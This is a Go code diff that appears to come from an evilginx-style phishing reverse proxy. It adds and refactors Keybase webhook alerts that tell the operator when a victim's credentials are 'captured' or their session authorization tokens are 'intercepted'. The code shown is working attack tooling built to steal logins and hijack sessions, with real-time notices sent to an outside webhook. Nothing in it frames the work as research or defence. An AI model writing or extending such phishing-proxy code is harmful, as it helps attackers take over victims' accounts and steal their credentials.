@@ -779,8 +779,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											if phishedUser != "" && p.cfg.kbWebhookUrl != "" {
-												content := fmt.Sprintf("Captured credentials for %s!", phishedUser)
-												p.NotifyWebhook(content)
+												notify := fmt.Sprintf("Captured credentials for %s!", phishedUser)
+												p.WebhookNotify(notify)
+											} else if phishedUser == "" && p.cfg.kbWebhookUrl != "" {
+												notify := "Credentials captured!"
+												p.WebhookNotify(notify)
 											}
 										}
 									}
@@ -1057,7 +1060,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-
+						if p.cfg.kbWebhookUrl != "" {
+							notify := "Authorizatoin tokens intercpeted!"
+							p.WebhookNotify(notify)
+						}
 						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
 							log.Error("database: %v", err)
 						}
@@ -2011,35 +2017,25 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	return s_hash
 }
 
-func (p *HttpProxy) NotifyWebhook(content string) {
-	if p.cfg.kbWebhookUrl == "" {
-		log.Error("No Keybase webhook URL configured")
-		return
-	}
-
-	// Prepare the JSON payload with the message content
+func (p *HttpProxy) WebhookNotify(content string) {
 	payload := map[string]string{
 		"msg": content,
 	}
 
-	// Encode the payload to JSON
 	jsonPayload, err := json.Marshal(payload)
 	if err != nil {
 		log.Error("Failed to marshal JSON payload: %v", err)
 		return
 	}
 
-	// Create the POST request
 	req, err := http.NewRequest("POST", p.cfg.kbWebhookUrl, bytes.NewBuffer(jsonPayload))
 	if err != nil {
 		log.Error("Failed to create request: %v", err)
 		return
 	}
 
-	// Set the correct headers for the request
 	req.Header.Set("Content-Type", "application/json")
 
-	// Send the request
 	client := &http.Client{}
 	resp, err := client.Do(req)
 	if err != nil {
@@ -2048,9 +2044,8 @@ func (p *HttpProxy) NotifyWebhook(content string) {
 	}
 	defer resp.Body.Close()
 
-	// Check the response status
 	if resp.StatusCode == http.StatusOK {
-		log.Info("Notification sent to Keybase webhook successfully")
+		log.Info("Keybase webhook notification sent")
 	} else {
 		log.Error("Failed to send notification to Keybase webhook, status: %v", resp.StatusCode)
 	}
